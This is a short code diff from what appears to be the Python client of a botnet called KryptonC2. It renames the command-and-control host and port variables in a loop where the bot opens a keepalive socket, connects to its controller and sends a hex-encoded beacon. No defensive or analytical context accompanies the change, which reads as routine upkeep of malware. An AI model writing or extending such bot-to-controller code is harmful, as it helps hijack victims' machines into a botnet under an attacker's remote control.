@@ -382,7 +382,7 @@ def main():
         c2.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
         while 1:
             try:
-                c2.connect((KRYPTONC2_ADDRESS, KRYPTONC2_PORT))
+                c2.connect((C2Host, C2Port))
                 while 1:
                     c2.send('669787761736865726500'.encode())
                     break
